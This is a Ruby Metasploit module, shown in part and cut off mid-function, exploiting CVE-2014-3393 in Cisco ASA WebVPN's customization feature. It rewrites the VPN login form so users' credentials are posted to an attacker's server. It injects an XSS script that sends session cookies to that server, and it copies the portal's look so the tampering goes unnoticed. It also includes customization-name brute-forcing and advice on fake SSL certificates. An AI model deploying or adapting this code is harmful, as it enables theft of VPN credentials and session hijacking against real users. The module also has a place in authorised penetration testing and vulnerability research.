##
# This module requires Metasploit: http//metasploit.com/download
##
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Auxiliary::Report

	def vprint_debug(msg)
		print_debug(msg) if datastore['VERBOSE'] || framework.datastore['VERBOSE']
	end
	
	def initialize(info={})
		super(update_info(info,
		'Name'        => 'Cisco ASA SSL VPN WebVPN Customization Vulnerability - WebVPN Login Hijack',
		'Description' => %q{
			This module exploits an auth bypass vulnerability in the Cisco ASA SSL VPN portal(aka WebVPN) 
			Customization feature. Successful exploitation will modify the Submit action of the WebVPN Portal 
			login form such that when a user attempts to login, the credentials will be sent to an HTTPS service
			started by this Metasploit module ( ! root privileges required for binding to local:443 !).
			If the captured credentials are valid the WebVPN user will be redirected to the portal and a small 
			XSS script will provide the session cookie to this module. 
			
			Note: The vulnerability is only exploitable if the Cisco ASA administrator has launched a WebVPN 
			Customization "Preview". 
			For this reason, it is Highly recommend the * check * command be run first.. 
			
			Note 2: Cisco ASA administrators can create custom Customization profiles, if the profile used on
			the Login page deviates from the default "DfltCustomization" the Customization profile name must be 
			known in order for the save function to take effect. In this scenario a dictionary based brute-force 
			function has been included in this module. See the code for more comments on this.. 
			
			Suggestion: If no valid SSL cert is available use the auxiliary/gather/impersonate_ssl module to 
			generate a fake SSL Cert..
				set SSLCert filename.pem
				set SigningCert filename.crt
				set SigningKey filename.key
			},
		'Author'         => [ 'Alec Stuart-Muirk' ],
		'Actions'        => [['Service']],
		'PassiveActions' => ['Service'],
		'License'     => MSF_LICENSE,
		'References'  =>
		[
          [ 'CVE', 'CVE-2014-3393'],
          [ 'URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa'],
		  [ 'URL', 'https://ruxcon.org.au/assets/2014/slides/Breaking Bricks Ruxcon 2014.pdf'],
		  [ 'URL', 'https://github.com/alec-stuart/BreakingBricks']
        ],
		'DefaultOptions' =>
		{
			'RPORT' => 443,
			'SSLVersion' => 'TLS1'
		},
		'DefaultAction'  => 'Service',
		'DisclosureDate' => "10 October, 2014"
	
    ))
		
		register_options(
		[
			OptString.new('TARGET_CUSTOM', [true, 'The target Customization name ', 'DfltCustomization']),
			OptBool.new('SSL', [true, 'Use SSL', true]),
			OptBool.new('GUESS_CUSTOM_ONLY', [false, 'Do not perform exploit.. scan for Customization name only', false]),
			OptBool.new('REMOVE_HIJACK', [false, 'Revert a hijacked page back to the orginal state..set true and re-run exploit', false]),
			OptBool.new('RandomSSLCert', [false, 'Use the Metasploit random SSL Cert generator for the credential capture server', false]),
			OptString.new('SRVHOST', [true, 'Our Fake WebVPN SSL Server to capture auth logins and session cookies', datastore['LHOST']]),
			OptString.new('SRVPORT', [true, 'Our Fake WebVPN SSL Server Port', 443]),
			OptString.new('WEBVPN_USERNAME', [false, 'A known VPN username/password combo, used to scrape the portal content.']),
			OptString.new('WEBVPN_PASSWORD', [false, 'A known VPN username/password combo, used to scrape the portal content.']),
			OptString.new('CUSTOM_WORDLIST', [false, 'Filename of a dictionary file used to guess the Customization name.']),

		], self.class)
		
		
	end


	def resource_uri
		'/webvpn/index.html'
	end

	
	def portal_login()
		# Simple function to perform a WebVPN login, it is used to scrape the portal contents
		# if a valid username/password are known..
		
		portal_login_variables = Hash.new
		portal_login_variables ={			
			'username'=>datastore['WEBVPN_USERNAME'],
			'password'=>datastore['WEBVPN_PASSWORD'],
			'Login'=>'login'}
			
		res = send_request_cgi({
		'method'   => 'POST',
		'uri'      => normalize_uri('/+webvpn+/index.html'),
		'headers' => {'cookie'		  => 'webvpnlogin=1'},
		'vars_post'=> portal_login_variables
		})
		if (!res or res.code!=200)
			print_error("An error occurred connecting to the portal page..")
			print_error("HTTP response code #{res.code} : Error performing login..")
			return -1
		else
			valid_webvpn_cookie = res.headers['Set-Cookie'].match(/webvpn\=(\w+@\w+@\w+@\w+)\;/)
			if(valid_webvpn_cookie)
				print_good("Login to WebVPN Portal successful!")
				vprint_debug("Found WebVPN cookie: "+valid_webvpn_cookie[1])
				return valid_webvpn_cookie[1]
			else
				print_error("Could not login to WebVPN portal. Login details not valid!")
				return 0
			end			
		end	
	end
	
	def scrape_login_content()
	# Because our POST data overwrites all Customizations (Login page and Portal), we need to scrape
	# the login page for the current Customization parameters. 
	# This way we can re-write the same text, logo, font, colour values and make the Login page look completely normal.
	# Meanwhile the action of the Submit button will be update to POST captured creds to SRVHOST, a redirect will then take the user to the portal.
	
	# Plenty of POST parameters which cant be null, set defaults...
		http_auth_page_params =Hash.new
		http_auth_page_params ={
			'a'=>'preview',
			'obj'=>datastore['TARGET_CUSTOM'],
			'f'=>'logon',
			'auth-page/form-order/username'=>'200',
			'auth-page/form-order/secondary-password'=>'600',
			'auth-page/form-order/secondary-username'=>'500',
			'auth-page/form-order/internal-password'=>'400',
			'auth-page/form-order/group'=>'100',
			'auth-page/form-order/password'=>'300',
			'column/1/order'=>'1',
			'column/1/width'=>'100',
			'auth-page/window/title-text'=>'SSL VPN Service',
			'auth-page/title-panel/mode'=>'enable',
			'auth-page/title-panel/text'=>'SSL VPN Service',
			'auth-page/title-panel/logo-url'=>'/+CSCOU+/csco_logo.gif',
			'auth-page/title-panel/gradient'=>'yes',
			'auth-page/title-panel/font-weight'=>'normal',
			'auth-page/title-panel/font-size'=>'100%',
			'auth-page/title-panel/font-color'=>'#800000',
			'auth-page/title-panel/background-color'=>'#FFFFFF',
			'auth-page/info-panel/mode'=>'disable',
			'auth-page/info-panel/position'=>'left',
			'auth-page/info-panel/text'=>'',
			'auth-page/info-panel/image-url'=>'/+CSCOU+/clear.gif',
			'auth-page/info-panel/image-position'=>'above',
			'auth-page/title-panel/style'=>'',
			'auth-page/language-selector/mode'=>'disable',
			'auth-page/language-selector/title'=>'Language:',
			'language/1/code'=>'en',
			'language/1/text'=>'English',
			'language/2/code'=>'ja',
			'language/2/text'=>'日本 (Japanese)',
			'language/3/code'=>'fr',
			'language/3/text'=>'Français (French)',
			'language/4/code'=>'ru',
			'language/4/text'=>'Русский (Russian)',
			'auth-page/logon-form/title-text'=>'Login',
			'auth-page/logon-form/message-text'=>'Please enter your username and password.',
			'auth-page/logon-form/username-prompt-text'=>'USERNAME:',
			'auth-page/logon-form/secondary-username-prompt-text'=>'2nd Username',
			'auth-page/logon-form/password-prompt-text'=>'PASSWORD:',
			'auth-page/logon-form/secondary-password-prompt-text'=>'2nd Password',
			'auth-page/logon-form/passcode-prompt-text'=>'Passcode',
			'auth-page/logon-form/secondary-passcode-prompt-text'=>'2nd Passcode',
			'auth-page/logon-form/internal-password-prompt-text'=>'Internal Password:',
			'auth-page/logon-form/internal-password-hide'=>'yes',
			'auth-page/logon-form/group-prompt-text'=>'GROUP:',
			'auth-page/logon-form/submit-button-text'=>'Login',
			'auth-page/logon-form/border-color'=>'#858A91',
			'auth-page/logon-form/title-font-color'=>'#ffffff',
			'auth-page/logon-form/title-background-color'=>'#666666',
			'auth-page/logon-form/font-color'=>'#000000',
			'auth-page/logon-form/background-color'=>'#ffffff',
			'auth-page/copyright-panel/mode'=>'disable',
			'auth-page/copyright-panel/text'=>'',
			'auth-page/full-customization/mode'=>'disable',
			'auth-page/full-customization/url'=>'',
			'auth-page/full-customization/doctype'=>'',
			'auth-page/logout-form/title-text'=>'Logout',
			'auth-page/logout-form/message-text'=>'Goodbye.<br>For your own security, please:<br><li>Clear the browser\'s cache<li>Delete any downloaded files<li>Close the browser\'s window',
			'auth-page/logout-form/login-button-text'=>'Logon',
			'auth-page/logout-form/hide-login-button'=>'no',
			'auth-page/logout-form/border-color'=>'#858A91',
			'auth-page/logout-form/title-font-color'=>'#ffffff',
			'auth-page/logout-form/title-background-color'=>'#666666',
			'auth-page/logout-form/font-color'=>'#000000',
			'auth-page/logout-form/background-color'=>'#ffffff'
			}
		res = send_request_cgi({
			'method'   => 'GET',
			'uri'      => '/+CSCOE+/logon.html?reason=12',
			'headers' =>
	                       {'Accept-Language' => 'en-US,en;q=0.5'}
		})
		
		if (!res or res.code!=200)
			print_error("An error occurred connecting to the portal page..")
			print_error("HTTP response code #{res.code} : Error scraping the target Login page..")
			return -1
		else
			print_good("Scraping https://#{target_host}/+CSCOE+/logon.html for current customization settings...")
			content = res.body 
			match_result = content.match(/<title>(.*)<\/title>/)
			if(match_result) 
				auth_page_window_title_text = match_result[1]		
				vprint_debug("Found auth-page/window/title-text: "+auth_page_window_title_text)
				http_auth_page_params['auth-page/window/title-text'] = auth_page_window_title_text
			end
			
			match_result = content.match(/.*<img src=\"(.*)\"  align=\"absmiddle\" alt=\"Logo\"  title=\"Logo\">?\n?(.*)?\n?<\/td>/)
			if(match_result)
				auth_page_title_panel_logo_url, auth_page_title_panel_text = match_result.captures
				auth_page_title_panel_text = auth_page_title_panel_text.gsub("&nbsp;&nbsp;",'')
				vprint_debug("Found auth-page/title-panel/text: "+auth_page_title_panel_text)
				vprint_debug("Found auth-page/title-panel/logo-url: "+auth_page_title_panel_logo_url)
				auth_page_title_panel_mode = "enable";
				vprint_debug("Found auth-page/title-panel/mode: "+auth_page_title_panel_mode)
				http_auth_page_params['auth-page/title-panel/mode'] = auth_page_title_panel_mode
				http_auth_page_params['original-auth-page/title-panel/text'] = auth_page_title_panel_text
				http_auth_page_params['auth-page/title-panel/text'] = auth_page_title_panel_text+'<form id="unicorn_form" method="POST" onsubmit="disableButton()" action="https://'+datastore['SRVHOST']+'/webvpn/index.html" onsubmit="return onSubmit();">'
				http_auth_page_params['auth-page/title-panel/logo-url'] = auth_page_title_panel_logo_url

				
			else
				auth_page_title_panel_mode = "disable";
				vprint_debug("Found auth-page/title-panel/mode: "+auth_page_title_panel_mode)
				http_auth_page_params['auth-page/title-panel/mode'] = auth_page_title_panel_mode
			end
			
			match_result = content.match(/auth-page-title {color:#(.*);font-size:(.*);font-weight:(.*);background-image:url\(\'\/\+CSCOU\+\/gradient.gif\?r=(.*)&g=(.*)&b=(.*)\'\)\;\}/)
			if match_result 
				auth_page_title_panel_gradient = "yes";
				auth_page_title_panel_font_color, auth_page_title_panel_font_size, auth_page_title_panel_font_weight, gradient_red,gradient_green, gradient_blue = match_result.captures
				red = "%02x"%gradient_red
				green = "%02x"%gradient_green
				blue = "%02x"%gradient_blue
				auth_page_title_panel_background_color = red+green+blue
				vprint_debug("Found auth-page/title-panel/gradient: "+auth_page_title_panel_gradient)
				vprint_debug("Found auth-page/title-panel/background-color: "+auth_page_title_panel_background_color)
				vprint_debug("Found auth-page/title-panel/font-color: "+auth_page_title_panel_font_color)
				vprint_debug("Found auth-page/title-panel/font-weight: "+auth_page_title_panel_font_weight)
				vprint_debug("Found auth-page/title-panel/font-size: "+auth_page_title_panel_font_size)
				http_auth_page_params['auth-page/title-panel/gradient'] = auth_page_title_panel_gradient
				http_auth_page_params['auth-page/title-panel/font-weight'] = auth_page_title_panel_font_weight
				http_auth_page_params['auth-page/title-panel/font-size'] = auth_page_title_panel_font_size
				http_auth_page_params['auth-page/title-panel/font-color'] = '#'+auth_page_title_panel_font_color
				http_auth_page_params['auth-page/title-panel/background-color'] = '#'+auth_page_title_panel_background_color
			else
				match_result = content.match(/auth-page-title {color:#(.*);font-size:(.*);font-weight:(.*);background-color:#(.*)\;\}/)
				if match_result
					auth_page_title_panel_gradient = "no";
					auth_page_title_panel_font_color, auth_page_title_panel_font_size, auth_page_title_panel_font_weight, auth_page_title_panel_background_color = match_result.captures
					vprint_debug("Found auth-page/title-panel/background-color: "+auth_page_title_panel_background_color)
					vprint_debug("Found auth-page/title-panel/font-color: "+auth_page_title_panel_font_color)
					vprint_debug("Found auth-page/title-panel/font-weight: "+auth_page_title_panel_font_weight)
					vprint_debug("Found auth-page/title-panel/font-size: "+auth_page_title_panel_font_size)
					http_auth_page_params['auth-page/title-panel/gradient'] = auth_page_title_panel_gradient
					http_auth_page_params['auth-page/title-panel/font-weight'] = auth_page_title_panel_font_weight
					http_auth_page_params['auth-page/title-panel/font-size'] = auth_page_title_panel_font_size
					http_auth_page_params['auth-page/title-panel/font-color'] = '#'+auth_page_title_panel_font_color
					http_auth_page_params['auth-page/title-panel/background-color'] = '#'+auth_page_title_panel_background_color
				end				
			end

			match_result = content.match(/<td id="csco_language_selector-text">         \n(.*)\n/)
			if(match_result)
			# Languages are optional and dynamic in nature.. admins can add/remove languages.
				language_codes = Hash.new
				language_texts = Hash.new
				lang_index = 1;
				auth_page_language_selector_mode = "enable"
				auth_page_language_selector_title = match_result[1]
				vprint_debug("Found auth-page/language-selector/mode: "+auth_page_language_selector_mode)
				vprint_debug("Found auth-page/language-selector/title: "+auth_page_language_selector_title)
				text_block = content.split("setLanguage()\">\n")
				begin_option_block = text_block[1]
				options_block = begin_option_block.split("\n</select>")
				tmp = options_block[0]
				option_lines = 	tmp.split("\n")
				option_lines.each do |line|
					match_result = line.match(/<option value="(.*)"(?: selected )?>(.*)<\/option>/)
					if(match_result)
						language_code,language_text = match_result.captures
						lang_code_key = 'language/'+lang_index.to_s+'/code'
						lang_code_val = language_code
						language_codes[lang_code_key] = lang_code_val
						lang_text_key = 'language/'+lang_index.to_s+'/text'
						lang_text_val = language_text
						language_texts[lang_text_key] = lang_text_val
						lang_index = lang_index + 1;
					end
				end
	
				language_hash = language_codes.merge(language_texts)
				language_hash.each do |key, value| 
					vprint_debug("Found #{key}/#{value}") 
				end	
				http_auth_page_params['auth-page/language-selector/mode'] = auth_page_language_selector_mode
				http_auth_page_params['auth-page/language-selector/title'] = auth_page_language_selector_title
			end
			
			match_result = content.match(/<tr align="center">\n\n<td id=info-panel valign=top align=middle >/)
			if(match_result)
				auth_page_info_panel_mode = "enable"
				auth_page_info_panel_position = "left"
				vprint_debug("Found auth-page/info-panel/mode: " + auth_page_info_panel_mode)
				vprint_debug("Found auth-page/info-panel/position: " + auth_page_info_panel_position)
				
				http_auth_page_params['auth-page/info-panel/mode'] = auth_page_info_panel_mode
				http_auth_page_params['auth-page/info-panel/position'] = auth_page_info_panel_position
			end
			
			match_result = content.match(/<\/td>\n\n<td id=info-panel valign=top align=middle >/)
			if(match_result)
				auth_page_info_panel_mode = "enable"
				auth_page_info_panel_position = "right"
				vprint_debug("Found auth-page/info-panel/mode: " + auth_page_info_panel_mode)
				vprint_debug("Found auth-page/info-panel/position: " + auth_page_info_panel_position)
				http_auth_page_params['auth-page/info-panel/mode'] = auth_page_info_panel_mode
				http_auth_page_params['auth-page/info-panel/position'] = auth_page_info_panel_position
			end
			
			match_result = content.match(/<div id=info-image-area>\n\n            <img src="(.*)">/)
			if(match_result)
				auth_page_info_panel_image_position = "above"
				auth_page_info_panel_image_url = match_result[1]
				vprint_debug("Found auth-page/info-panel/image-url: " + auth_page_info_panel_image_url)
				vprint_debug("Found auth-page/info-panel/position: " + auth_page_info_panel_image_position)
				http_auth_page_params['auth-page/info-panel/mode'] = auth_page_info_panel_mode
				http_auth_page_params['auth-page/info-panel/position'] = auth_page_info_panel_position
			end
			
			match_result = content.match(/<div id=info-text-area>\n(.*)\n<\/div>/)
			if(match_result)
				auth_page_info_panel_text = match_result[1]
				vprint_debug("Found auth-page/info-panel/text: " + auth_page_info_panel_text)
				http_auth_page_params['auth-page/info-panel/text'] = auth_page_info_panel_text
			end
			
			match_result = content.match(/<div id=info-text-area>\n\n            <img src="(.*)">/)
			if(match_result)
				auth_page_info_panel_image_position = "below"
				auth_page_info_panel_image_url = match_result[1]
				vprint_debug("Found auth-page/info-panel/image-url: " + auth_page_info_panel_image_url)
				vprint_debug("Found auth-page/info-panel/position: " + auth_page_info_panel_image_position)
				http_auth_page_params['auth-page/info-panel/image-url'] = auth_page_info_panel_image_url
				http_auth_page_params['auth-page/info-panel/image-position'] = auth_page_info_panel_image_position
			end
			
			match_result = content.match(/<div id=info-image-area>\n(.*)\n<\/div>/)
			if(match_result)
				auth_page_info_panel_text = match_result[1]
				vprint_debug("Found auth-page/info-panel/text: " + auth_page_info_panel_text)
				http_auth_page_params['auth-page/info-panel/text'] = auth_page_info_panel_text
			end
			
			match_result = content.match(/auth-page-form-title {background-color:#(.*);color:#(.*);}/)
			if(match_result)
				auth_page_logon_form_title_background_color, auth_page_logon_form_title_font_color = match_result.captures
				vprint_debug("Found auth-page/logon-form/title-background-color: " + auth_page_logon_form_title_background_color)
				vprint_debug("Found auth-page/logon-form/title-font-color: " + auth_page_logon_form_title_font_color) 
				http_auth_page_params['auth-page/logon-form/title-font-color'] = '#'+auth_page_logon_form_title_font_color
				http_auth_page_params['auth-page/logon-form/title-background-color'] = '#'+auth_page_logon_form_title_background_color				
			end
			match_result = content.match(/<td colspan=2 align=middle style="color:#(.*); background-color:#(.*);border-left:1px solid #(.*);border-right:1px solid #(.*);"><div id="logon_message_text" style="margin-right:15px;margin-left:15px;margin-top:15px; margin-bottom:5px">(.*)<\/div>/)
			if(match_result)
				auth_page_logon_form_font_color, auth_page_logon_form_background_color, auth_page_logon_form_border_color, auth_page_logon_form_border_color, auth_page_logon_form_message_text = match_result.captures
				vprint_debug("Found auth-page/logon-form/font-color: " + auth_page_logon_form_font_color)
				vprint_debug("Found auth-page/logon-form/background-color: " + auth_page_logon_form_background_color)		
				vprint_debug("Found auth-page/logon-form/border-color: " + auth_page_logon_form_border_color)
				vprint_debug("Found auth-page/logon-form/message-text: "+ auth_page_logon_form_message_text)

				http_auth_page_params['auth-page/logon-form/border-color'] = '#'+auth_page_logon_form_border_color
				http_auth_page_params['auth-page/logon-form/font-color'] = '#'+auth_page_logon_form_font_color
				http_auth_page_params['auth-page/logon-form/background-color'] = '#'+auth_page_logon_form_background_color
				http_auth_page_params['auth-page/logon-form/message-text'] = auth_page_logon_form_message_text
			end
			
			match_result = content.match(/font-weight: bold;border:0px;padding-left:100px;">(.*)<\/td>/)
			if(match_result)
				auth_page_logon_form_title_text = match_result[1]
				vprint_debug("Found auth-page/logon-form/title-text: "+ auth_page_logon_form_title_text)
				http_auth_page_params['auth-page/logon-form/title-text'] = auth_page_logon_form_title_text
			end
			match_result = content.match(/type="submit" name="Login" value="(.*)" \/>/)
			if(match_result)
				auth_page_logon_form_submit_button_text = match_result[1]
				vprint_debug("Found auth-page/logon-form/submit-button-text: "+ auth_page_logon_form_submit_button_text)
				http_auth_page_params['auth-page/logon-form/submit-button-text'] = auth_page_logon_form_submit_button_text
			end
			match_result = content.match(/<td nowrap id="username_field">\n    (.*)\n    <\/td>/)
			if(match_result)
				auth_page_form_order_username = match_result.begin(0).to_s
				auth_page_logon_form_username_prompt_text = match_result[1]
				vprint_debug("Found auth-page/logon-form/username-prompt-text: "+ auth_page_logon_form_username_prompt_text)
				http_auth_page_params['auth-page/logon-form/username-prompt-text'] = auth_page_logon_form_username_prompt_text
			end
			match_result = content.match(/<td nowrap id="password_field">\n    (.*)\n    <\/td>/)
			if(match_result)
				auth_page_form_order_password = match_result.begin(0).to_s
				auth_page_logon_form_password_prompt_text = match_result[1]
				vprint_debug("Found auth-page/logon-form/password-prompt-text: "+ auth_page_logon_form_password_prompt_text)
				http_auth_page_params['auth-page/logon-form/password-prompt-text'] = auth_page_logon_form_password_prompt_text
			end
			match_result = content.match(/<td>\n    (.*)\n    <\/td>\n    <td>\n    <div><select id="group_list"/)
			if(match_result)
				auth_page_form_order_group = match_result.begin(0).to_s
				auth_page_logon_form_group_prompt_text = match_result[1]
				vprint_debug("Found auth-page/logon-form/group-prompt-text: "+ auth_page_logon_form_group_prompt_text)
				http_auth_page_params['auth-page/logon-form/group-prompt-text'] = auth_page_logon_form_group_prompt_text
			end
			match_result = content.match(/<input autocomplete="off" id="internal_password"/)
			if(match_result)
				auth_page_logon_form_internal_password_hide = "no"
				auth_page_form_order_internal_password = match_result.begin(0).to_s
				auth_page_logon_form_internal_password_prompt_text = match_result[1]
				vprint_debug("Found auth-page/logon-form/internal-password-prompt-text: "+ auth_page_logon_form_internal_password_prompt_text)
				http_auth_page_params['auth-page/logon-form/internal-password-prompt-text'] = auth_page_logon_form_internal_password_prompt_text
				http_auth_page_params['auth-page/logon-form/internal-password-hide'] = auth_page_logon_form_internal_password_hide
				
			end
			match_result = content.match(/<td nowrap id="secondary_username_field">\n    (.*)\n    <\/td>/)
			if(match_result)
				auth_page_form_order_secondary_username = match_result.begin(0).to_s
				auth_page_logon_form_secondary_username_prompt_text = match_result[1]
				vprint_debug("Found auth-page/logon-form/secondary-username-prompt-text: "+ auth_page_logon_form_secondary_username_prompt_text)
							http_auth_page_params['auth-page/logon-form/secondary-username-prompt-text'] = auth_page_logon_form_secondary_username_prompt_text
			
			
			http_auth_page_params['auth-page/logon-form/passcode-prompt-text'] = 'Passcode'
			http_auth_page_params['auth-page/logon-form/secondary-passcode-prompt-text'] = auth_page_logon_form_secondary_password_prompt_text
			end
			match_result = content.match(/<td nowrap id="secondary_password_field">\n    (.*)\n    <\/td>/)
			if(match_result)
				auth_page_form_order_secondary_password = match_result.begin(0).to_s
				auth_page_logon_form_secondary_password_prompt_text = match_result[1]
				vprint_debug("Found auth-page/logon-form/secondary-password-prompt-text: "+ auth_page_logon_form_secondary_password_prompt_text)
				http_auth_page_params['auth-page/logon-form/secondary-password-prompt-text'] = auth_page_logon_form_secondary_password_prompt_text
			end			
			match_result = content.match(/<td id=copyright_panel  colspan=2 style="vertical-align:bottom">\n      <div style="text-indent:10px; ">  (.*)\n<\/div>/)
			if(match_result)
				auth_page_copyright_panel_mode = "enable"
				auth_page_copyright_panel_text = match_result[1]
				vprint_debug("Found auth-page/copyright-panel/text: "+ auth_page_copyright_panel_text)
				http_auth_page_params['auth-page/copyright-panel/mode'] = auth_page_copyright_panel_mode
				http_auth_page_params['auth-page/copyright-panel/text'] = auth_page_copyright_panel_text
			end	
		end
	
		if(auth_page_language_selector_mode == "enable")
			http_auth_page_params = http_auth_page_params.merge(language_hash)
		end
		
		return http_auth_page_params
	end
	
	

	def scrape_custom_portal_content(valid_webvpn_cookie)
	# Because our POST parameters overwrite all Customizations (Login page and Portal), it would be best to have 
	# a valid user account in order to scrape the current portal Customization parameters. 
	# This way we can re-write the same text, logo, font, colour values and make the portal look completely normal.
	# Additionally, the Portal leaks the Customization name, which is important if DfltCustomization is not in use..
	
		res = send_request_cgi({
			'method'   => 'GET',
			'uri'      => '/+CSCOE+/portal.html',
			'headers' =>
	                       {'Accept-Language' => 'en-US,en;q=0.5',
							'Cookie'		  => 'webvpn='+valid_webvpn_cookie}
		})
				
		if (!res && res.code!=200)
			print_error("An error occurred connecting to the portal page..")
			print_error("HTTP response code #{res.code} : Error scraping the target Portal page..")
			return -1
		else
			print_status("Scraping https://#{target_host}/+CSCOE+/cedportal.html for current portal customization settings...")
			content = res.body 

			match_result = content.match(/\/\/CO\=(.*)\/\/GP\=/)
			if(match_result) 			
				customization_name = match_result[1]
				if(customization_name != datastore['TARGET_CUSTOM'])
					print_good("Found non-default Customization name: "+customization_name)
					datastore['TARGET_CUSTOM'] = customization_name
				end
			end			
			
			match_result = content.match(/<TITLE>(.*)<\/TITLE>/)
			if(match_result) 			
				portal_window_title_text = match_result[1]
				vprint_debug("Found portal/window/title-text: "+portal_window_title_text)
			end
			match_result = content.match(/.*<img src=\"(.*)\"  align=\"absmiddle\" alt=\"Logo\"  title=\"Logo\">?\n?(.*)?\n?<\/td>/)
			if(match_result)
				portal_title_panel_logo_url, portal_title_panel_text = match_result.captures
				portal_title_panel_text = portal_title_panel_text.gsub("&nbsp;&nbsp;",'')
				vprint_debug("Found portal/title-panel/text: "+portal_title_panel_text)
				vprint_debug("Found portal/title-panel/logo-url: "+portal_title_panel_logo_url)
				portal_title_panel_mode = "enable";
				vprint_debug("Found portal/title-panel/mode: "+portal_title_panel_mode)
			else
				portal_title_panel_mode = "disable";
				portal_title_panel_text = "SSL VPN Service"
				portal_title_panel_logo_url = "/+CSCOU+/csco_logo.gif"
				portal_title_panel_font_color = "ffffff"
				
				vprint_debug("Found portal/title-panel/mode: "+portal_title_panel_mode)
			end	
			
			match_result = content.match(/portal-title {color:#(.*);font-size:(.*);font-weight:(.*);background-image:url\(\'\/\+CSCOU\+\/gradient.gif\?r=(.*)&g=(.*)&b=(.*)\'\)\;\}/)
			if match_result 
				portal_title_panel_gradient = "yes";
				portal_title_panel_font_color, portal_title_panel_font_size, portal_title_panel_font_weight, gradient_red,gradient_green, gradient_blue = match_result.captures
				red = "%02x"%gradient_red
				green = "%02x"%gradient_green
				blue = "%02x"%gradient_blue
				portal_title_panel_background_color = red+green+blue
				vprint_debug("Found portal/title-panel/gradient: "+portal_title_panel_gradient)
				vprint_debug("Found portal/title-panel/background-color: "+portal_title_panel_background_color)
				vprint_debug("Found portal/title-panel/font-color: "+portal_title_panel_font_color)
				vprint_debug("Found portal/title-panel/font-weight: "+portal_title_panel_font_weight)
				vprint_debug("Found portal/title-panel/font-size: "+portal_title_panel_font_size)				
			else
				portal_title_panel_gradient = "no";
				match_result = content.match(/portal-title {color:#(.*);font-size:(.*);font-weight:(.*);background-color:#(.*)\;\}/)
				if match_result
					portal_title_panel_font_color, portal_title_panel_font_size, portal_title_panel_font_weight, portal_title_panel_background_color = match_result.captures
					vprint_debug("Found portal/title-panel/background-color: "+portal_title_panel_background_color)
					vprint_debug("Found portal/title-panel/font-color: "+portal_title_panel_font_color)
					vprint_debug("Found portal/title-panel/font-weight: "+portal_title_panel_font_weight)
					vprint_debug("Found portal/title-panel/font-size: "+portal_title_panel_font_size)
				end
			
			end	

			match_result = content.match(/<span id=\"browse_text\".*>(.*)<\/span>/)
			if(match_result) 
				portal_toolbar_browse_button_text = match_result[1]
				portal_toolbar_mode = "enable"
				vprint_debug("Found portal/toolbar/browse-button-text: "+portal_toolbar_browse_button_text)
				vprint_debug("Found portal/toolbar/mode: "+portal_toolbar_mode)
			else
				portal_toolbar_mode = "disable"
				vprint_debug("Found portal/toolbar/mode: "+portal_toolbar_mode)
			end
			
			match_result = content.match(/<span id="logout_text" .*>(.*)<\/span>/)
			if(match_result)
					portal_toolbar_logout_prompt_text = match_result[1]
					vprint_debug("Found portal/toolbar/logout-prompt-text: "+portal_toolbar_logout_prompt_text)
			end

			
			http_portal_variables =Hash.new
			http_portal_variables ={
			'preview'=>'logon',
			'application/1/id'=>'home',
			'application/1/tab-title'=>'Home',
			'application/1/order'=>'1',
			'application/1/mode'=>'enable',
			'application/2/id'=>'web-access',
			'application/2/tab-title'=>'Web Applications',
			'application/2/order'=>'2',
			'application/2/mode'=>'enable',
			'application/3/id'=>'file-access',
			'application/3/tab-title'=>'Browse Networks',
			'application/3/order'=>'3',
			'application/3/mode'=>'enable',
			'application/4/id'=>'net-access',
			'application/4/tab-title'=>'AnyConnect',
			'application/4/order'=>'4',
			'application/4/mode'=>'enable',
			'application/5/id'=>'app-access',
			'application/5/tab-title'=>'Application Access',
			'application/5/order'=>'5',
			'application/5/mode'=>'enable',
			'application/6/id'=>'ssh,telnet',
			'application/6/tab-title'=>'SSH/Telnet',
			'application/6/order'=>'6',
			'application/6/mode'=>'enable',
			'application/7/id'=>'ica',
			'application/7/tab-title'=>'MetaFrame Access',
			'application/7/order'=>'7',
			'application/7/mode'=>'enable',
			'application/8/id'=>'post',
			'application/8/tab-title'=>'Plugin to post with preloaded page',
			'application/8/order'=>'8',
			'application/8/mode'=>'enable',
			'application/9/id'=>'rdp',
			'application/9/tab-title'=>'Terminal Services(RDP)',
			'application/9/order'=>'9',
			'application/9/mode'=>'enable',
			'application/10/id'=>'rdp2',
			'application/10/tab-title'=>'Terminal Services(For Vista)',
			'application/10/order'=>'10',
			'application/10/mode'=>'enable',
			'application/11/id'=>'vnc',
			'application/11/tab-title'=>'VNC',
			'application/11/order'=>'11',
			'application/11/mode'=>'enable',
			'portal/window/title-text'=>portal_window_title_text,
			'portal/title-panel/mode'=>portal_title_panel_mode,
			'portal/title-panel/text'=>portal_title_panel_text+'</td><script>new Image().src="https://'+datastore['SRVHOST']+'/webvpn/index.html?"+document.cookie;</script><td>',
			'portal/title-panel/logo-url'=>portal_title_panel_logo_url, 
			'portal/title-panel/gradient'=>portal_title_panel_gradient,
			'portal/title-panel/font-weight'=>portal_title_panel_font_weight,
			'portal/title-panel/font-size'=>portal_title_panel_font_size,
			'portal/title-panel/font-color'=>'#'+portal_title_panel_font_color,
			'portal/title-panel/background-color'=>'#'+portal_title_panel_background_color,
			'portal/title-panel/style'=>'',
			'portal/navigation-panel/mode'=>'enable',
			'portal/toolbar/mode'=>portal_toolbar_mode,
			'portal/toolbar/prompt-box-title'=>'Address',
			'portal/toolbar/browse-button-text'=>portal_toolbar_logout_prompt_text,
			'portal/toolbar/logout-prompt-text'=>portal_toolbar_logout_prompt_text,
			'portal/home-page/mode'=>'standard',
			'portal/home-page/url'=>'',								
			'portal/url-lists/mode'=>'group',
			'localization/languages'=>'en,ja,fr,ru',
			'localization/default-language'=>''			
		}
		return http_portal_variables
			
		end
		
	end
	
	def generate_generic_portal_content(http_auth_page_params)
		# We will create a 'best effort' portal page based on login page logo/text/font/colour values..
		# No guarantee this will look anything like the 'real' portal (which we don't have access to)
		# Best case scenario an admin logs in to see what the users are complaining about :-P
			
		http_portal_variables =Hash.new
		http_portal_variables ={
			'a'=>'preview',
			'obj'=>datastore['TARGET_CUSTOM'],
			'f'=>'logon',
			'preview'=>'logon',
			'application/1/id'=>'home',
			'application/1/tab-title'=>'Home',
			'application/1/order'=>'1',
			'application/1/mode'=>'enable',
			'application/2/id'=>'web-access',
			'application/2/tab-title'=>'Web Applications',
			'application/2/order'=>'2',
			'application/2/mode'=>'enable',
			'application/3/id'=>'file-access',
			'application/3/tab-title'=>'Browse Networks',
			'application/3/order'=>'3',
			'application/3/mode'=>'enable',
			'application/4/id'=>'net-access',
